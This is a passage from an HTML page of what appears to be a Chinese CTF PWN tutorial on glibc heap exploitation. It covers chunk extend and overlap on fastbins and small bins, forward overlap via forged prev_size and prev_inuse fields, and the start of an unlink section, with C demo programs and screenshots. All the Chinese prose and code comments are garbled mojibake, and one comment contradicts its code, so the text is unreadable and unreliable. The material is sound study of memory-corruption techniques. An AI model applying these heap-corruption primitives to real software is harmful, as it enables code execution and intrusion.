punctuation">;</span>   <span class="token comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬ <code>malloc</code> ä¸¤ä¸ªå †å—åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A85.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨5.png"></p><p>ç„¶åä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸä¸º <code>0x41</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A86.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨6.png"></p><p>å¯ä»¥çœ‹åˆ° <code>free</code> æ‰ <code>chunk1</code> åï¼Œ<code>chunk2</code> ä¹Ÿè¢« <code>free</code> æ‰äº†ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A87.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨7.png"></p><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬å†é€šè¿‡ <code>malloc(0x30)</code> åˆ†é…å †å—ï¼Œå°±ä¼šå¾—åˆ° <code>chunk1 + chunk2</code> çš„å—ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥æ§åˆ¶ <code>chunk2</code> ä¸­çš„å†…å®¹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A88.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨8.png"></p><p>è¿™ç§çŠ¶æ€å°±ç§°ä¸º <code>Overlap chunk</code></p><hr><h2 id="å¯¹-inuse-çš„-small-bin-è¿›è¡Œ-extend"><a href="#å¯¹-inuse-çš„-small-bin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ inuse çš„ small bin è¿›è¡Œ extend"></a>å¯¹ inuse çš„ small bin è¿›è¡Œ extend</h2><blockquote><p>å½“ <code>free</code> æ‰çš„ <code>chunk size &gt;= 144</code>ï¼ˆ0x90ï¼‰å­—èŠ‚æ—¶ï¼Œä¼šè¢«ç½®äº <code>unsorted bin</code> ä¸­ï¼Œè¿™æ¬¡ä»¥ <code>malloc(0x80)</code> æ¥ä¸¾ä¾‹</p><p>ä¸å‰é¢çš„ <code>fast bin</code> ä¸åŒçš„æ˜¯ï¼Œè¿™ç§æƒ…å†µä¸‹è¿˜éœ€è¦å† <code>malloc</code> ä¸€å—ç©ºé—´ç”¨æ¥é˜²æ­¢ <code>unsorted bin</code> ä¸ <code>top chunk</code> åˆå¹¶</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„ chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„ chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// é˜²æ­¢ä¸ top chunk åˆå¹¶</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬ <code>malloc</code> ä¸‰ä¸ªå †å—åï¼ˆ<code>chunk3</code> ç”¨æ¥é˜²æ­¢ <code>chunk1</code> è¢«ç¯¡æ”¹å¹¶ <code>free</code> åä¸ <code>top chunk</code> åˆå¹¶ï¼‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A89.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨9.png"></p><p>ç„¶åä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸä¸º <code>0xb1</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A810.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨10.png"></p><p>å¯ä»¥çœ‹åˆ° <code>free</code> æ‰ <code>chunk1</code> åï¼Œ<code>chunk2</code> ä¹Ÿè¢« <code>free</code> æ‰äº†ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A811.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨11.png"></p><p>æ­¤æ—¶ <code>chunk1</code> å’Œ <code>chunk2</code> è¢«ä¸€èµ·ç½®å…¥ <code>unsorted bin</code></p><p>æ­¤æ—¶å¦‚æœæˆ‘ä»¬å†é€šè¿‡ <code>malloc(0xa0)</code> åˆ†é…å †å—ï¼Œå°±ä¼šå¾—åˆ° <code>chunk1 + chunk2</code> çš„å—ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥æ§åˆ¶ <code>chunk2</code> ä¸­çš„å†…å®¹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A812.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨12.png"></p><hr><h2 id="å¯¹-free-çš„-small-bin-è¿›è¡Œ-extend"><a href="#å¯¹-free-çš„-small-bin-è¿›è¡Œ-extend" class="headerlink" title="å¯¹ free çš„ small bin è¿›è¡Œ extend"></a>å¯¹ free çš„ small bin è¿›è¡Œ extend</h2><blockquote><p>åœ¨ï¼Œå…ˆé‡Šæ”¾ <code>chunk1</code>ï¼Œç„¶åå†ä¿®æ”¹å¤„äº <code>unsorted bin</code> ä¸­çš„ <code>chunk1</code> çš„ <code>size</code> åŸŸï¼Œä¼šä½¿å¾— chunk2 ä¹Ÿè¢«ç½®äº <code>unsorted bin</code> ä¸­</p><p>å½“æˆ‘ä»¬å†æ¬¡è¯·æ±‚è¿™ä¸¤ä¸ªå †å—å¤§å°ä¹‹å’Œçš„å †å—æ—¶ï¼Œå°±ä¼šè·å¾— <code>chunk1 + chunk2</code> çš„ç©ºé—´ï¼Œä¹Ÿå°±å¯ä»¥æ§åˆ¶ <code>chunk2</code> çš„å†…å®¹</p></blockquote><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„ chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„ chunk2</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// é¦–å…ˆè¿›è¡Œé‡Šæ”¾ï¼Œä½¿å¾— chunk1 è¿›å…¥ unsorted bin</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>malloc</code> åˆ†é…ä¸¤ä¸ªå †å—åï¼Œç›´æ¥ <code>free</code> æ‰ <code>chunk1</code> ä½¿å…¶è¢«ç½®äº <code>unsorted bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A813.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨13.png"></p><p>æ­¤æ—¶ä¿®æ”¹ <code>unsorted bin</code> çš„ <code>size</code> åŸŸä¸º <code>0xb1</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> çš„å¤§å°ï¼‰ï¼Œå‘ç° <code>chunk2</code> ä¹Ÿè¢«ç½®äº <code>unsorted bin</code> ä¸­ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A814.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨14.png"></p><p>ç„¶åå† <code>malloc(0xa0)</code> çš„å¤§å°å°±å¯ä»¥å¾—åˆ°Â <code>chunk1 + chunk2</code> çš„å †å—ï¼Œä»è€Œæ§åˆ¶äº† <code>chunk2</code> çš„å†…å®¹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A815.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨15.png"></p><hr><h2 id="é€šè¿‡-extend-åå‘-Overlap"><a href="#é€šè¿‡-extend-åå‘-Overlap" class="headerlink" title="é€šè¿‡ extend åå‘ Overlap"></a>é€šè¿‡ extend åå‘ Overlap</h2><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 1 ä¸ª 0x80 çš„ chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 2 ä¸ª 0x10 çš„ chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 3 ä¸ª 0x10 çš„ chunk3</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// åˆ†é…ç¬¬ 4 ä¸ª 0x10 çš„ chunk4    </span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>malloc</code> åˆ†é…å››ä¸ªå †å—åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A816.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨16.png"></p><p>ä¿®æ”¹ <code>chunk1</code> çš„ <code>size</code> åŸŸä¸º <code>0x61</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code>ã€<code>chunk3</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A817.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨17.png"></p><p>æ­¤æ—¶ <code>free</code> æ‰ <code>chunk1</code>ï¼Œåˆ™ <code>chunk2</code>ã€<code>chunk3</code> ä¹Ÿä¸€å¹¶è¢« <code>free</code> è¿›å…¥ <code>fast bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A818.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨18.png"></p><p>åœ¨ <code>malloc(0x50)</code> å¯¹ <code>extend</code> åŒºåŸŸé‡æ–°å ä½åï¼Œå…¶ä¸­ <code>0x10</code> çš„ <code>fastbin</code> å—ä¾ç„¶å¯ä»¥æ­£å¸¸çš„åˆ†é…å’Œé‡Šæ”¾ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A819.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨19.png"></p><p>æ­¤æ—¶å·²ç»æ„æˆ <code>Overlap</code>ï¼Œé€šè¿‡å¯¹ <code>Overlap</code> çš„è¿›è¡Œæ“ä½œå¯ä»¥å®ç° <code>fastbin attack</code></p><hr><h2 id="é€šè¿‡-extend-å‰å‘-Overlap"><a href="#é€šè¿‡-extend-å‰å‘-Overlap" class="headerlink" title="é€šè¿‡ extend å‰å‘ Overlap"></a>é€šè¿‡ extend å‰å‘ Overlap</h2><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin1</span>    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin1</span>    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin2</span>    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// é˜²æ­¢ä¸ top åˆå¹¶</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>   <span class="token comment">// ä¿®æ”¹ pre_inuse åŸŸ</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>   <span class="token comment">// ä¿®æ”¹ pre_size åŸŸ</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// unlink è¿›è¡Œå‰å‘ extend</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// å ä½å—</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ <code>malloc</code> åˆ†é…äº”ä¸ªå †å—åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A820.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨20.png"></p><p>æ­¤æ—¶ <code>free</code> æ‰ <code>chunk1</code> ä½¿å…¶ç½®å…¥ <code>unsorted bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A821.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨21.png"></p><p>ä¿®æ”¹ <code>chunk4</code> çš„ <code>size</code> åŸŸä¸º <code>0x90</code>ï¼ˆå…¶ä¸­ <code>pre_inuse</code> ä½ä¸º 0ï¼Œä»£è¡¨å‰ä¸€ä¸ª <code>chunk</code> ç©ºé—²ï¼‰</p><p>ä¿®æ”¹ <code>pre_size</code> åŸŸä¸º <code>0xd0</code>ï¼ˆåŒ…æ‹¬äº† <code>chunk2</code> å’Œ <code>chunk3</code> çš„å¤§å°ï¼‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A822.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨22.png"></p><p>æ­¤æ—¶ <code>free</code> æ‰ <code>chunk4</code>ï¼Œä¼šå¯¼è‡´ <code>chunk2</code> å’Œ <code>chunk3</code> ä¹Ÿä¸€å¹¶è¢« <code>free</code>ï¼ŒåŒæ—¶ä¸ <code>free</code> æ‰ <code>chunk1</code> åå½¢æˆçš„ <code>unsorted bin</code> åˆå¹¶ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A823.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨23.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A824.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨24.png"></p><p>åœ¨ <code>malloc(0x150)</code> å¯¹ <code>extend</code> åŒºåŸŸé‡æ–°å ä½åï¼Œå°±å¯ä»¥å¾—åˆ°Â <code>chunk1 + chunk2 + chunk3 + chunk4</code> çš„å †å—</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A825.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨25.png"></p><p>å‰å‘ <code>extend</code> åˆ©ç”¨äº† <code>smallbin</code> çš„ unlink æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹ <code>pre_size</code> åŸŸå¯ä»¥è·¨è¶Šå¤šä¸ª <code>chunk</code> è¿›è¡Œåˆå¹¶å®ç° <code>Overlap</code></p><hr><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><blockquote><p><code>unlink()</code> æ˜¯ Glibc ä¸­çš„ä¸€ä¸ªå®ï¼Œå…¶ç›®çš„æ˜¯å°†æŸä¸€ä¸ªç©ºé—² <code>chunk</code> ä»å…¶æ‰€å¤„çš„ <code>bin</code> ä¸­è„±é“¾</p><ul><li>åœ¨ <code>malloc_consolidate()</code> å‡½æ•°ä¸­ç”¨äºå°† <code>fast bin</code> ä¸­çš„ç©ºé—² <code>chunk</code> æ•´ç†åˆ° <code>unsorted bin</code>  </li><li>åœ¨ <code>malloc()</code> å‡½æ•°ä¸­ç”¨äºå°† <code>unsorted bin</code> ä¸­çš„ç©ºé—² <code>chunk</code> æ•´ç†åˆ° <code>small bin</code> æˆ–è€… <code>large bin</code>ï¼Œä»¥åŠåœ¨ <code>malloc()</code> ä¸­è·å¾—å †ç©ºé—´æ—¶ï¼Œå‡æœ‰å¯èƒ½è°ƒç”¨ <code>unlink()</code> å®</li></ul><p>å‚è€ƒæ–‡ç« ï¼š  </p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">Unlink - CTF Wiki</a>  </li><li><a href="https://blog.csdn.net/Morphy_Amo/article/details/122631424">ã€pwnå­¦ä¹ ã€‘å †æº¢å‡ºï¼ˆä¸‰ï¼‰- Unlinkå’ŒUAF_pwn unlink-CSDNåšå®¢</a></li></ol></blockquote><p>åœ¨åˆ©ç”¨ unlink æ‰€é€ æˆçš„æ¼æ´æ—¶ï¼Œå…¶å®å°±æ˜¯å¯¹ <code>chunk</code> è¿›è¡Œå†…å­˜å¸ƒå±€ï¼Œç„¶åå€ŸåŠ© unlink æ“ä½œæ¥è¾¾æˆä¿®æ”¹æŒ‡é’ˆçš„æ•ˆæœ</p><p><code>unlink()</code> çš„å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>é¦–å…ˆæ ¹æ® <code>chunk P</code> çš„ <code>fd</code> å’Œ <code>bk</code> å‚æ•°ç¡®å®š <code>chunk P</code> åœ¨ <code>bin</code> ä¸­çš„å‰å <code>chunk</code> åˆ†åˆ«ä¸º <code>FD</code> å’Œ <code>BK</code></li><li>ç„¶åè®© <code>chunk FD</code> çš„ <code>bk</code> å‚æ•°æŒ‡å‘ <code>chunk BK</code></li><li>æœ€åè®© <code>chunk BK</code> çš„ <code>fd</code> å‚æ•°æŒ‡å‘ <code>chunk FD</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A826.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨26.png"></p><hr><h2 id="æ²¡æœ‰é˜²æŠ¤çš„-unlink"><a href="#æ²¡æœ‰é˜²æŠ¤çš„-unlink" class="headerlink" title="æ²¡æœ‰é˜²æŠ¤çš„ unlink"></a>æ²¡æœ‰é˜²æŠ¤çš„ unlink</h2><blockquote><p>è¿™æ˜¯æ¯”è¾ƒå¤è€çš„ unlink åˆ©ç”¨æ–¹æ³•ï¼Œæ²¡æœ‰å¯¹ <code>chunk</code> çš„ <code>size</code> æ£€æŸ¥å’ŒåŒå‘é“¾è¡¨æ£€æŸ¥</p></blockquote><p>Glibc ä¸­æ²¡æœ‰é˜²æŠ¤çš„ <code>unlink()</code> å®å®šä¹‰ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span></span>    FD <span class="token 